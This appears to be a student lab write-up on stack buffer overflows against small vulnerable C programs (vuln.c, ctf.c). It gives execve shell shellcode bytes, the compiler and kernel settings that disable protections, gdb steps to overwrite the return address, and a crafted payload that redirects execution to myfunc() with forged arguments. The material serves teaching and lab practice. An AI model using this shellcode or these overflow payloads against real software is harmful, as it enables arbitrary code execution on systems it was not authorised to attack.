# 1. Inject code to delete file
## b. Privilege escalation 

Before deleting file

![Picture before deleting](/Chapter-2/imgs/Privilege-dummyfile.png)

File sh.asm

![Picture about sh.asm](/Chapter-2/imgs/ctf.png)

Firstly, we have to assembles the assembly source file and links the object file to create an executable file

`nasm -g -f elf sh.asm
ld -m elf_i386 -o sh sh.o
`

After that, we use `for i in $(objdump -d sh |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo` to extracts the machine code.
- \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80
- This program is 27 bytes

We need to get the shellcode into buf in vuln; insert the starting position of buf into ret addr so that the program goes back to executing the command we just inserted into buf.

Stack frame:

![Picture about program](/Chapter-2/imgs/Inject-Stack-Frame.png)

Insert 27 bytes shellcode + 41 bytes random character = 68 bytes = buf + ebp

Set up:
- `gcc vuln.c -o vuln.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2`
- `sudo ln -sf /bin/zsh /bin/sh` create new shell that allows code execution on stack, default does not allow

Using gdb and watch main()

![Picture about gdb of main](/Chapter-2/imgs/Inject-gdb-main.png)

Create breakpoints
- Set at +6, after stackframe is set
- Set at +48, ​​before strcpy we see that eax has been pushed twice so esp is now - 8 bytes. Therefore, we set breakpoint after adding 8 bytes to esp

![Picture about creating breakpoints](/Chapter-2/imgs/Inject-breakpoint.png)

Use `r $(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80' + 'a'*41 + '\xff\xff\xff\xff’)")`
- set 4 bytes of ret addr to 0xffffffff for easy searching

After setting stackframe

![Picture gdb at +6](/Chapter-2/imgs/Privilege-plus6.png)

After strcpy

![Picture gdb at +48](/Chapter-2/imgs/Inject-gdb-before.png)

Now we know where ret addr is. Now we replace ret addr with $esp.

![Picture about replacing value of ret addr](/Chapter-2/imgs/Inject-gdb-after.png)

The address in ret addr has been replaced with esp so the program returns and continues executing the instructions in the stack frame.

Then we use `rm -r -f dummyfile` to delete file
- `rm` (remove) command
- `-f` (force) option to bypass protection or requires confirmation
- `-r` (recursive) option

![Picture about using command to delete file](/Chapter-2/imgs/Privilege-delete.png)

The result is that we delete successfully dummyfile

![Picture about using command to delete file](/Chapter-2/imgs/Privilege-result.png)

# 2. Conduct attack on ctf.c

![Picture about ctf.c](/Chapter-2/imgs/ctf.png)

The vulnerability is strcpy(buf, s) at line 31 because s can have a longer length than buf.

First, we have to set up system `sudo sysctl -w kernel.randomize_va_space=0` so that system doesn't random variable's address

Normal stack frame of the program:

![Picture about ctf.c stack frame](/Chapter-2/imgs/ctf-Stack-Frame-normal.png)

If we want the program to run the function myfunc(), we need to assign its address to the return address of vuln().

Using gdb and `disas myfunc` we know `0x0804851b` is its address:

![Picture about using gdb myfunc()](/Chapter-2/imgs/ctf-gdb.png)

Stack frame of myfunc():

![Picture about myfunc stack frame](/Chapter-2/imgs/ctf-Stack-Frame-myfunc.png)

However, because we perform buffer overflow to execute the myfunc() function, we are missing 2 arguments p and q:

![Picture about ctf.c stack frame buffer](/Chapter-2/imgs/ctf-Stack-Frame-buffer.png)

Based on the stack frame, ebp of main() must contain the value of p and ret addr of main() must contain the value of q

`./ctf.out $(python -c "print(104*'a' + '\x1b\x85\x04\x08' + 4*'a' + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")`
- `104*'a'` assigns arbitrary values ​​to buf and ebp of vuln()
- `\x1b\x85\x04\x08` assigns the address of myfunc() to the ret addr of vuln()
- `4*'a'` assigns arbitrary value to s of vuln()
- `\x11\x12\x08\x04` assigns the value p to the ebp of main()
- `\x62\x42\x64\x44` assigns the value q to the ret addr of main()

![Picture about result](/Chapter-2/imgs/ctf-result.png)
